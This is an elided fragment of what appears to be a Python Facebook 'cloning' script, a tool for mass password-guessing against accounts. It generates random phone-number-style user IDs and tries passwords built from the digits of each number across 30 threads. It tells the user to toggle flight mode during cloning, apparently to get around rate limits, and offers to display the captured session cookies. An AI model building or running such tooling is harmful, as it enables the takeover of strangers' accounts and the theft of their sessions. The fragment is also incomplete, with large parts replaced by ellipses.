...
#os.system('xdg-open https://www.facebook.com/Anshu.Ki.Jaan.Hu.Mk.Prajapati')
...
def infinty():
    ...
    print(f'[\033[1;31m0\033[1;37m] 𝗘𝗫𝗜𝗧')
    lines()
...
def random_number():
    ...
    with ThreadPool(max_workers=30) as Adiltariq:
        ...
        print('\033[1;37m[\033[1;31m+\033[1;37m] Use Flightmod Turn Off/On During Cloning')
        lines()
        for user in user_ID:
            uid = code+user
...
def random_number2():
    ...
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = ['57273200','first7digit','last7digit','first6digit','last6digit','fullnumber']
    with ThreadPool(max_workers=30) as Adiltariq:
        total = str(len(user_ID))
        clear()
        print(f"[{green}+{white}] Do You Want To Show Cookies Y/N")
